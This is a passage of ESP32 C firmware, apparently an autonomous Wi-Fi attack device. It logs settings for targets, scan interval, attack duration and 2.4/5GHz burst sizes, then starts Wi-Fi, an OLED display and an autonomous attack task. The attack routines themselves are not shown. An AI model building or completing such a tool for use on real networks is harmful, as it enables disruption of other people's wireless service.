    log_to_all("🎯 Max targets: %d", MAX_TARGETS);
    log_to_all("⏱️  Scan interval: %d seconds", AUTO_SCAN_INTERVAL_SEC);
    log_to_all("⚡ Attack duration: %d seconds", AUTO_ATTACK_DURATION_SEC);
    log_to_all("🔥 2.4GHz burst: %d | 5GHz burst: %d", BURST_SIZE_24GHZ, BURST_SIZE_5GHZ);
    log_to_all("⚠️  USE ONLY ON YOUR OWN NETWORKS!");
    log_to_all("");
}

// ==================== Main ====================
void app_main(void) {
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    // Initialise Wi-Fi
    wifi_init_sta();

    // Initialise OLED
    oled_init();
    display_mutex = xSemaphoreCreateMutex();
    xTaskCreate(display_task, "display", 4096, NULL, 2, NULL);

    // Autonomous mode task
#if AUTO_MODE_ENABLED
    xTaskCreate(autonomous_mode_task, "auto_mode", 8192, NULL, 5, NULL);
    log_to_all("🤖 Optimised autonomous mode started");
#endif

    while (1) {
        vTaskDelay(pdMS_TO_TICKS(10000));
    }
}
